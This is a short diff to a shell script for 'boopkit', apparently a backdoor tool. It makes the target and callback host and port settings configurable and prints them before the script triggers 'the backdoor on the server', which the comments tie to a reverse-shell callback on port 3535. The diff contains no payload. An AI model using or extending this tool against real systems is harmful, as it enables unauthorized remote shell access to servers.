@@ -24,8 +24,8 @@
 #
 # This is the boopscript (public) address of
 # the server running boopkit.
-RHOST="127.0.0.1"
-RPORT="22"
+RHOST=${RHOST:-"127.0.0.1"}
+RPORT=${RPORT:-"22"}
 
 # [Local address]
 #
@@ -33,8 +33,8 @@ RPORT="22"
 # the machine that boopkit will call back to.
 #
 # Boopkit hard-codes port "3535" for the callback!
-LHOST="127.0.0.1"
-LPORT="3535"
+LHOST=${LHOST:-"127.0.0.1"}
+LPORT=${LPORT:-"3535"}
 
 # [Reverse shell]
 #
@@ -67,6 +67,11 @@ if [ "$EUID" -ne 0 ]
   then echo "Permission denied."
   exit
 fi
+
+echo "LHOST : ${LHOST}"
+echo "LPORT : ${LPORT}"
+echo "RHOST : ${RHOST}"
+echo "RPORT : ${RPORT}"
 
 # Right away trigger the backdoor on the server
 trigger &
